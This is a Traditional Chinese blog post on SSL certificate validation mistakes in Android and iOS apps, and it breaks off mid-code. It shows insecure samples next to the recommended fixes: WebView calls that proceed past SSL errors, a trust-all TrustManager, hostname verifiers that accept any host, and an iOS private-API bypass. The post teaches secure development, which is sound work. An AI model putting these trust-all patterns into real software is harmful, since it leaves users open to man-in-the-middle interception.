&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140815/desktop_browser_insecure_warning.png&quot; alt=&quot;Desktop 警告圖&quot; /&gt;&lt;br /&gt;
而在手機應用程式上 HTTPS 同樣重要，例如網路銀行、線上購物等。系統同樣會做憑證核對，但對被判定為無效的憑證就需要開發者作出額外的處理了。許多手機應用程式開發商在這個部分並沒有妥善處理好，以下我們就幾個常見的成因做基本的探討。&lt;/p&gt;

&lt;h3 id=&quot;會被系統判定為無效的常見成因&quot;&gt;會被系統判定為無效的常見成因？&lt;/h3&gt;
&lt;p&gt;在探討該如何處理這個問題之前，這裡先列出一些有可能被系統判定成無效憑證的成因。&lt;/p&gt;

&lt;h4 id=&quot;1-系統支援問題-&quot;&gt;1. 系統支援問題 &lt;sup id=&quot;fnref:note1&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/h4&gt;
&lt;p&gt;在 Android 2.2 及之前的版本，對 SSL 的支援上存在著一些問題，像是 &lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=12908&quot;&gt;SNI&lt;/a&gt; 和 &lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=26542&quot;&gt;Multiple Chain&lt;/a&gt;。而 Android 上不接受缺少中繼 CA 憑證的憑證鏈，例如：&lt;a href=&quot;https://egov.uscis.gov/&quot;&gt;https://egov.uscis.gov/&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;2-相關憑證未被預載到系統中&quot;&gt;2. 相關憑證未被預載到系統中&lt;/h4&gt;
&lt;p&gt;以 GCA 簽發的 SSL 憑證為例，在 Windows 上被判定為有效，但在 iOS 系統上卻因為 CA 不在系統的預載清單中而被判定為無效。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140815/windows_recognize_gca.png&quot; alt=&quot;Windows&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20140815/iphone_unknown_ca.png&quot; alt=&quot;iPhone&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;3-使用自行簽發的憑證&quot;&gt;3. 使用自行簽發的憑證&lt;/h4&gt;
&lt;p&gt;這種情況常出現在應用程式開發階段的內部測試環境中，由於是內部測試環境一般都不會花錢去申請憑證。&lt;/p&gt;

&lt;h4 id=&quot;4-連線被中間人mitm攻擊&quot;&gt;4. 連線被中間人(MITM)攻擊&lt;/h4&gt;
&lt;p&gt;當連線被 MITM 攻擊時，使用者原本的連線目的地會被導到攻擊者的設備上，此時伺服器憑證也會被取代成攻擊者自行簽發的憑證，造成原本正常的連線出現異常。&lt;/p&gt;

&lt;h3 id=&quot;開發者該如何處理&quot;&gt;開發者該如何處理？&lt;/h3&gt;

&lt;p&gt;理想情況下，客戶端的支援度充足，伺服器憑證鏈的來源及設定正確，只需使用系統原有的方式去檢查憑證即可達到安全效果。但若非得要相容低版本系統或是自行簽發憑證的時候，就得自行做額外的檢查。&lt;/p&gt;

&lt;p&gt;在處理方式上，普遍是使用憑證綁定 (certificate pinning) 的方式，把需要比對的憑證預先存放在應用程式裡，待要進行 SSL Handshake 的時候再與伺服器的憑證做比對。&lt;/p&gt;

&lt;p&gt;可是在實務上，大多開發人員採用消極的方法，把錯誤警告略過讓連線繼續進行，使得本來使用 SSL 加密連線帶來的安全性形同虛設。據 2012 年 &lt;a href=&quot;http://android-ssl.org/files/p50-fahl.pdf&quot;&gt;Why Eve and Mallory Love Android: An Analysis of SSL (In)Security on Android&lt;/a&gt; 這篇論文指出，在 Google Play 上 13500 個免費熱門應用程式當中，共有 1074 個 (8%) 應用程式因錯誤的 SSL 處理而導致使用者陷入 MITM 攻擊的風險中。&lt;/p&gt;

&lt;p&gt;下面我們整理了一些在手機應用開發上，常見的 SSL 處理錯誤，以及其對應適當的處理方法。&lt;/p&gt;

&lt;h4 id=&quot;android-錯誤處理情況1&quot;&gt;Android 錯誤處理情況1&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;onReceivedSslError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WebView&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SslErrorHandler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SslError&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;proceed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;當透過 WebView 元件訪問 HTTPS 網站發生 SSL 錯誤時，會觸發 onReceivedSslError 這個函數。根據官方文件指出，可藉由執行 handler.proceed() 或是 handler.cancel() 來決定是否讓連線繼續進行。在不覆寫這函數的情況下預設會執行 handler.cancel()。而上面的做法卻讓異常的連線繼續進行了。&lt;/p&gt;

&lt;p&gt;較為恰當的做法是使用 handler.cancel() 讓連線終止，或是限制在開發階段才執行 handler.proceed()。像 &lt;a href=&quot;https://github.com/apache/cordova-android/blob/3.5.1/framework/src/org/apache/cordova/CordovaWebViewClient.java#L298&quot;&gt;Apache Coradova&lt;/a&gt; 和 &lt;a href=&quot;https://github.com/facebook/facebook-android-sdk/blob/sdk-version-3.15.0/facebook/src/com/facebook/widget/WebDialog.java#L420&quot;&gt;Facebook Android SDK&lt;/a&gt; 皆有對這部分做控管。&lt;/p&gt;

&lt;h4 id=&quot;android-錯誤處理情況2&quot;&gt;Android 錯誤處理情況2&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trustAllManager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;X509TrustManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkClientTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkServerTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;     &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;X509Certificate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getAcceptedIssuers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sslContext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;TLS&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sslContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trustAllManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;本用來檢查伺服器憑證的 checkServerTrusted 被留空，導致警告被略過。Google 建議不要自行實作 TrustManager，而是把憑證放到 KeyStore，再把 KeyStore 放到 TrustManagerFactory，最後從 TrustManagerFactory 產出相關的 TrustManager，開發文件中有提供處理的&lt;a href=&quot;https://developer.android.com/training/articles/security-ssl.html#UnknownCa&quot;&gt;範例&lt;/a&gt;。OWASP 的 WIKI 上也有提供自行實作 TrustManager 做 certificate pinning 的&lt;a href=&quot;https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning#Android&quot;&gt;範例&lt;/a&gt;。&lt;sup id=&quot;fnref:note2&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;p&gt;下面節錄 Android 官方文件上的範例：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KeyStore&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyStore&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;...;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;algorithm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManagerFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDefaultAlgorithm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManagerFactory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TrustManagerFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;algorithm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keyStore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;TLS&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTrustManagers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;https://www.example.com/&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpsURLConnection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpsURLConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;openConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setSSLSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&quot;android-錯誤處理情況3&quot;&gt;Android 錯誤處理情況3&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;https://www.example.com/&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpsURLConnection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpsURLConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;openConnection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setHostnameVerifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SSLSocketFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ALLOW_ALL_HOSTNAME_VERIFIER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;或是&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HostnameVerifier&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;allHostVerifier&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HostnameVerifier&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt;     &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hostname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SSLSession&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;4&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;5&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;上述寫法略過了憑證中的 hostname 檢查，導致即使連線端與憑證中指定的 hostname 不一致也能通過。較為恰當的做法是不特別設定，讓他使用預設的 DefaultHostnameVerifier，或是採用更為嚴謹的 StrictHostnameVerifier。&lt;/p&gt;

&lt;h4 id=&quot;ios-錯誤處理情況1&quot;&gt;iOS 錯誤處理情況1&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;@implementation&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;NSURLRequest&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;(IgnoreSSL)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;allowsAnyHTTPSCertificateForHost:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;host&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;4&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;YES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;@end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;此情況使用到 Framework 中的 Private API，雖然這種寫法會因為不能通過 Apple 的審查而不會出現在 AppStore 上(使用回避技巧不在這討論範圍內)，但仍有機會在無需經過 Apple 審查的 Enterprise App 中使用。較為適當的做法是用 “#if DEBUG”，”#endif” 包起來以確保該段程式在編譯時只能對開發中的 debug 版上有作用。&lt;/p&gt;

&lt;h4 id=&quot;ios-錯誤處理情況2&quot;&gt;iOS 錯誤處理情況2&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connection:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLConnection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;canAuthenticateAgainstProtectionSpace:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLProtectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;protectionSpace&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt; 
